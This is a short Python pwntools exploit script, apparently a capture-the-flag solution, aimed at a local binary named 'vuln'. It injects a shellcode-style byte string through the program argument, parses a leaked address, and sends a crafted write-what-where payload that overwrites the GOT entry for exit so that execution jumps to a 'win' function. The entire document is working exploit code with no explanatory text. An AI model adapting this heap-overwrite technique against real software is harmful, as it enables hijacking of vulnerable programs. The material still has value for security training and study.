#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')
p = process(['./vuln', 'A'*12 + "\xB8\x66\x89\x04\x08\xFF\xD0"])

context.terminal = ['tmux', 'new-window']
#gdb.attach(p, 'b *main+243')

exit_got = elf.got['exit']
win = elf.symbols['win']

log.info('exit: ' + hex(exit_got))
log.info('win: ' + hex(win))

first_addr = int(p.recv().split('\n')[1].strip('\n'))

log.info('first: ' + hex(first_addr))

p.sendline(p32(exit_got-0xc) + p32(first_addr + 12))

p.interactive()
